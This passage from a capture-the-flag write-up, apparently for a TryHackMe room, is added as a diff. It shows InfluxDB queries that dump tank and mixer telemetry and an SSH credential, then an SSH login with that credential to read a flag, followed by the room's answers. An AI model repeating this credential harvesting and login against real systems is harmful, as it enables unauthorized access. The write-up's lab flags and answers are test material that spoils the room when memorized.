@@ -673,3 +673,679 @@ Starting InfluxDB shell - .back to go back
                         ],
 
 [o5yY6yya@10.10.132.162/tanks] $ SELECT temperature FROM water_tank
+
+                       [
+                            "2021-05-20T13:00:00Z",
+                            20.2
+                        ],
+                        [
+                            "2021-05-20T14:00:00Z",
+                            22.82
+                        ],
+                        [
+                            "2021-05-20T15:00:00Z",
+                            21.31
+                        ]
+                    ]
+                }
+            ],
+            "statement_id": 0
+        }
+    ]
+}
+
+[o5yY6yya@10.10.132.162/tanks] $ .back
+
+Databases:
+
+1) creds
+2) docker
+3) tanks
+4) mixer
+5) _internal
+
+.quit to exit
+[o5yY6yya@10.10.132.162] Database: 4
+
+Starting InfluxDB shell - .back to go back
+
+[o5yY6yya@10.10.132.162/mixer] $ show measurements
+{
+    "results": [
+        {
+            "series": [
+                {
+                    "columns": [
+                        "name"
+                    ],
+                    "name": "measurements",
+                    "values": [
+                        [
+                            "mixer_stats"
+                        ]
+                    ]
+                }
+            ],
+            "statement_id": 0
+        }
+    ]
+}
+
+[o5yY6yya@10.10.132.162/mixer] $ show field keys
+{
+    "results": [
+        {
+            "series": [
+                {
+                    "columns": [
+                        "fieldKey",
+                        "fieldType"
+                    ],
+                    "name": "mixer_stats",
+                    "values": [
+                        [
+                            "filling_height",
+                            "float"
+                        ],
+                        [
+                            "motor_rpm",
+                            "float"
+                        ],
+                        [
+                            "temperature",
+                            "float"
+                        ]
+                    ]
+                }
+            ],
+            "statement_id": 0
+        }
+    ]
+}
+
+[o5yY6yya@10.10.132.162/mixer] $ SELECT motor_rpm FROM mixer_stats
+
+                        [
+                            "2021-05-20T12:00:00Z",
+                            4228
+                        ],
+                        [
+                            "2021-05-20T13:00:00Z",
+                            4848
+                        ],
+                        [
+                            "2021-05-20T14:00:00Z",
+                            4274
+                        ],
+                        [
+                            "2021-05-20T15:00:00Z",
+                            4875
+                        ]
+                    ]
+                }
+            ],
+            "statement_id": 0
+        }
+    ]
+}
+
+[o5yY6yya@10.10.132.162/mixer] $ SELECT motor_rpm FROM mixer_stats
+{
+    "results": [
+        {
+            "series": [
+                {
+                    "columns": [
+                        "time",
+                        "motor_rpm"
+                    ],
+                    "name": "mixer_stats",
+                    "values": [
+                        [
+                            "2021-05-16T12:00:00Z",
+                            4000
+                        ],
+                        [
+                            "2021-05-16T13:00:00Z",
+                            4042
+                        ],
+                        [
+                            "2021-05-16T14:00:00Z",
+                            4578
+                        ],
+                        [
+                            "2021-05-16T15:00:00Z",
+                            4218
+                        ],
+                        [
+                            "2021-05-16T16:00:00Z",
+                            4628
+                        ],
+                        [
+                            "2021-05-16T17:00:00Z",
+                            4654
+                        ],
+                        [
+                            "2021-05-16T18:00:00Z",
+                            4502
+                        ],
+                        [
+                            "2021-05-16T19:00:00Z",
+                            4520
+                        ],
+                        [
+                            "2021-05-16T20:00:00Z",
+                            4486
+                        ],
+                        [
+                            "2021-05-16T21:00:00Z",
+                            4678
+                        ],
+                        [
+                            "2021-05-16T22:00:00Z",
+                            4766
+                        ],
+                        [
+                            "2021-05-16T23:00:00Z",
+                            4842
+                        ],
+                        [
+                            "2021-05-17T00:00:00Z",
+                            4348
+                        ],
+                        [
+                            "2021-05-17T01:00:00Z",
+                            4096
+                        ],
+                        [
+                            "2021-05-17T02:00:00Z",
+                            4016
+                        ],
+                        [
+                            "2021-05-17T03:00:00Z",
+                            4314
+                        ],
+                        [
+                            "2021-05-17T04:00:00Z",
+                            4290
+                        ],
+                        [
+                            "2021-05-17T05:00:00Z",
+                            4234
+                        ],
+                        [
+                            "2021-05-17T06:00:00Z",
+                            4824
+                        ],
+                        [
+                            "2021-05-17T07:00:00Z",
+                            4228
+                        ],
+                        [
+                            "2021-05-17T08:00:00Z",
+                            4790
+                        ],
+                        [
+                            "2021-05-17T09:00:00Z",
+                            4644
+                        ],
+                        [
+                            "2021-05-17T10:00:00Z",
+                            4844
+                        ],
+                        [
+                            "2021-05-17T11:00:00Z",
+                            4380
+                        ],
+                        [
+                            "2021-05-17T12:00:00Z",
+                            4050
+                        ],
+                        [
+                            "2021-05-17T13:00:00Z",
+                            4814
+                        ],
+                        [
+                            "2021-05-17T14:00:00Z",
+                            4558
+                        ],
+                        [
+                            "2021-05-17T15:00:00Z",
+                            4560
+                        ],
+                        [
+                            "2021-05-17T16:00:00Z",
+                            4144
+                        ],
+                        [
+                            "2021-05-17T17:00:00Z",
+                            4034
+                        ],
+                        [
+                            "2021-05-17T18:00:00Z",
+                            4754
+                        ],
+                        [
+                            "2021-05-17T19:00:00Z",
+                            4528
+                        ],
+                        [
+                            "2021-05-17T20:00:00Z",
+                            4410
+                        ],
+                        [
+                            "2021-05-17T21:00:00Z",
+                            4172
+                        ],
+                        [
+                            "2021-05-17T22:00:00Z",
+                            4642
+                        ],
+                        [
+                            "2021-05-17T23:00:00Z",
+                            4832
+                        ],
+                        [
+                            "2021-05-18T00:00:00Z",
+                            4596
+                        ],
+                        [
+                            "2021-05-18T01:00:00Z",
+                            4862
+                        ],
+                        [
+                            "2021-05-18T02:00:00Z",
+                            4328
+                        ],
+                        [
+                            "2021-05-18T03:00:00Z",
+                            4410
+                        ],
+                        [
+                            "2021-05-18T04:00:00Z",
+                            4320
+                        ],
+                        [
+                            "2021-05-18T05:00:00Z",
+                            4240
+                        ],
+                        [
+                            "2021-05-18T06:00:00Z",
+                            4148
+                        ],
+                        [
+                            "2021-05-18T07:00:00Z",
+                            4592
+                        ],
+                        [
+                            "2021-05-18T08:00:00Z",
+                            4308
+                        ],
+                        [
+                            "2021-05-18T09:00:00Z",
+                            4538
+                        ],
+                        [
+                            "2021-05-18T10:00:00Z",
+                            4092
+                        ],
+                        [
+                            "2021-05-18T11:00:00Z",
+                            4272
+                        ],
+                        [
+                            "2021-05-18T12:00:00Z",
+                            4258
+                        ],
+                        [
+                            "2021-05-18T13:00:00Z",
+                            4382
+                        ],
+                        [
+                            "2021-05-18T14:00:00Z",
+                            4752
+                        ],
+                        [
+                            "2021-05-18T15:00:00Z",
+                            4120
+                        ],
+                        [
+                            "2021-05-18T16:00:00Z",
+                            4762
+                        ],
+                        [
+                            "2021-05-18T17:00:00Z",
+                            4572
+                        ],
+                        [
+                            "2021-05-18T18:00:00Z",
+                            4372
+                        ],
+                        [
+                            "2021-05-18T19:00:00Z",
+                            4346
+                        ],
+                        [
+                            "2021-05-18T20:00:00Z",
+                            4070
+                        ],
+                        [
+                            "2021-05-18T21:00:00Z",
+                            4728
+                        ],
+                        [
+                            "2021-05-18T22:00:00Z",
+                            4060
+                        ],
+                        [
+                            "2021-05-18T23:00:00Z",
+                            4578
+                        ],
+                        [
+                            "2021-05-19T00:00:00Z",
+                            4212
+                        ],
+                        [
+                            "2021-05-19T01:00:00Z",
+                            4058
+                        ],
+                        [
+                            "2021-05-19T02:00:00Z",
+                            4486
+                        ],
+                        [
+                            "2021-05-19T03:00:00Z",
+                            4364
+                        ],
+                        [
+                            "2021-05-19T04:00:00Z",
+                            4306
+                        ],
+                        [
+                            "2021-05-19T05:00:00Z",
+                            4780
+                        ],
+                        [
+                            "2021-05-19T06:00:00Z",
+                            4072
+                        ],
+                        [
+                            "2021-05-19T07:00:00Z",
+                            4466
+                        ],
+                        [
+                            "2021-05-19T08:00:00Z",
+                            4004
+                        ],
+                        [
+                            "2021-05-19T09:00:00Z",
+                            4226
+                        ],
+                        [
+                            "2021-05-19T10:00:00Z",
+                            4196
+                        ],
+                        [
+                            "2021-05-19T11:00:00Z",
+                            4740
+                        ],
+                        [
+                            "2021-05-19T12:00:00Z",
+                            4024
+                        ],
+                        [
+                            "2021-05-19T13:00:00Z",
+                            4764
+                        ],
+                        [
+                            "2021-05-19T14:00:00Z",
+                            4724
+                        ],
+                        [
+                            "2021-05-19T15:00:00Z",
+                            4834
+                        ],
+                        [
+                            "2021-05-19T16:00:00Z",
+                            4418
+                        ],
+                        [
+                            "2021-05-19T17:00:00Z",
+                            4798
+                        ],
+                        [
+                            "2021-05-19T18:00:00Z",
+                            4818
+                        ],
+                        [
+                            "2021-05-19T19:00:00Z",
+                            4862
+                        ],
+                        [
+                            "2021-05-19T20:00:00Z",
+                            4220
+                        ],
+                        [
+                            "2021-05-19T21:00:00Z",
+                            4684
+                        ],
+                        [
+                            "2021-05-19T22:00:00Z",
+                            4344
+                        ],
+                        [
+                            "2021-05-19T23:00:00Z",
+                            4846
+                        ],
+                        [
+                            "2021-05-20T00:00:00Z",
+                            4316
+                        ],
+                        [
+                            "2021-05-20T01:00:00Z",
+                            4354
+                        ],
+                        [
+                            "2021-05-20T02:00:00Z",
+                            4834
+                        ],
+                        [
+                            "2021-05-20T03:00:00Z",
+                            4392
+                        ],
+                        [
+                            "2021-05-20T04:00:00Z",
+                            4390
+                        ],
+                        [
+                            "2021-05-20T05:00:00Z",
+                            4012
+                        ],
+                        [
+                            "2021-05-20T06:00:00Z",
+                            4860
+                        ],
+                        [
+                            "2021-05-20T07:00:00Z",
+                            4270
+                        ],
+                        [
+                            "2021-05-20T08:00:00Z",
+                            4196
+                        ],
+                        [
+                            "2021-05-20T09:00:00Z",
+                            4332
+                        ],
+                        [
+                            "2021-05-20T10:00:00Z",
+                            4494
+                        ],
+                        [
+                            "2021-05-20T11:00:00Z",
+                            4728
+                        ],
+                        [
+                            "2021-05-20T12:00:00Z",
+                            4228
+                        ],
+                        [
+                            "2021-05-20T13:00:00Z",
+                            4848
+                        ],
+                        [
+                            "2021-05-20T14:00:00Z",
+                            4274
+                        ],
+                        [
+                            "2021-05-20T15:00:00Z",
+                            4875
+                        ]
+                    ]
+                }
+            ],
+            "statement_id": 0
+        }
+    ]
+}
+
+[o5yY6yya@10.10.132.162/creds] $ show measurements
+{
+    "results": [
+        {
+            "series": [
+                {
+                    "columns": [
+                        "name"
+                    ],
+                    "name": "measurements",
+                    "values": [
+                        [
+                            "ssh"
+                        ]
+                    ]
+                }
+            ],
+            "statement_id": 0
+        }
+    ]
+}
+[o5yY6yya@10.10.132.162/creds] $ show field keys
+{
+    "results": [
+        {
+            "series": [
+                {
+                    "columns": [
+                        "fieldKey",
+                        "fieldType"
+                    ],
+                    "name": "ssh",
+                    "values": [
+                        [
+                            "pw",
+                            "float"
+                        ]
+                    ]
+                }
+            ],
+            "statement_id": 0
+        }
+    ]
+}
+
+[o5yY6yya@10.10.132.162/creds] $ select * from ssh
+{
+    "results": [
+        {
+            "series": [
+                {
+                    "columns": [
+                        "time",
+                        "pw",
+                        "user"
+                    ],
+                    "name": "ssh",
+                    "values": [
+                        [
+                            "2021-05-16T12:00:00Z",
+                            7788764472,
+                            "uzJk6Ry98d8C"
+                        ]
+                    ]
+                }
+            ],
+            "statement_id": 0
+        }
+    ]
+}
+
+ssh uzJk6Ry98d8C:7788764472
+
+┌──(witty㉿kali)-[~/Downloads/marshalsec/target]
+└─$ ssh uzJk6Ry98d8C@10.10.132.162 -p2222
+The authenticity of host '[10.10.132.162]:2222 ([10.10.132.162]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:rxhYa4K7GBaKlDryL+Uko+qzgdtrJ80xKRHD4WYAWr8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.132.162]:2222' (ED25519) to the list of known hosts.
+uzJk6Ry98d8C@10.10.132.162's password: 
+Permission denied, please try again.
+uzJk6Ry98d8C@10.10.132.162's password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+uzJk6Ry98d8C@ed2300f3fc23:~$ ls -lah /
+total 84K
+drwxr-xr-x 62 root root 4.0K Jul  9 02:41 .
+drwxr-xr-x 62 root root 4.0K Jul  9 02:41 ..
+-rwxr-xr-x  1 root root    0 Jul  9 02:19 .dockerenv
+drwxr-xr-x  2 root root 4.0K May 18  2021 bin
+drwxr-xr-x  2 root root 4.0K Apr 20  2017 boot
+drwxr-xr-x 12 root root 2.7K Jul  9 02:20 dev
+-rwxrwxr-x  1 root root   88 Jul  8  2017 entrypoint.sh
+drwxr-xr-x 82 root root 4.0K Jul  9 02:19 etc
+drwxr-xr-x  7 root root 4.0K Jul  9 02:20 home
+-rwxr-xr-x  1 root root 5.0K May 18  2021 initializeandquery.sh
+drwxr-xr-x 16 root root 4.0K May 18  2021 lib
+drwxr-xr-x  2 root root 4.0K Jun 20  2017 lib64
+drwxr-xr-x  2 root root 4.0K Jun 20  2017 media
+drwxr-xr-x  2 root root 4.0K Jun 20  2017 mnt
+drwxr-xr-x  2 root root 4.0K Jun 20  2017 opt
+dr-xr-xr-x 99 root root    0 Jul  9 02:20 proc
+drwx------  4 root root 4.0K May 18  2021 root
+drwxr-xr-x  5 root root 4.0K Jul  9 02:41 run
+drwxr-xr-x  2 root root 4.0K May 18  2021 sbin
+drwxr-xr-x  2 root root 4.0K Jun 20  2017 srv
+dr-xr-xr-x 13 root root    0 Jul  9 02:20 sys
+drwxrwxrwt  2 root root 4.0K Jul  9 02:41 tmp
+drwxr-xr-x 22 root root 4.0K May 18  2021 usr
+drwxr-xr-x 21 root root 4.0K Jul  9 02:41 var
+
+uzJk6Ry98d8C@ed2300f3fc23:~$ id
+uid=1000(uzJk6Ry98d8C) gid=1000(uzJk6Ry98d8C) groups=1000(uzJk6Ry98d8C)
+uzJk6Ry98d8C@ed2300f3fc23:~$ ls
+data  meta.db  user.txt  wal
+uzJk6Ry98d8C@ed2300f3fc23:~$ cat user.txt
+THM{V4w4FhBmtp4RFDti}
+```
+- What is the database user you find?
+- *o5yY6yya*
+- What was the temperature of the water tank at 1621346400 (UTC Unix Timestamp)?
+- *22.5*
+- What is the highest rpm the motor of the mixer reached?
+- *4875*
+- What username do you find in one of the databases?
+- *uzJk6Ry98d8C*
+- user.txt
+- ***THM{V4w4FhBmtp4RFDti}***
+- ***THM{5qsDivHdCi2oabwp}***
+- ***THM{nY2ZahyFABAmjrnx}***
+
+## Notes / Lessons Learned
+[[Lumberjack Turtle]]
+
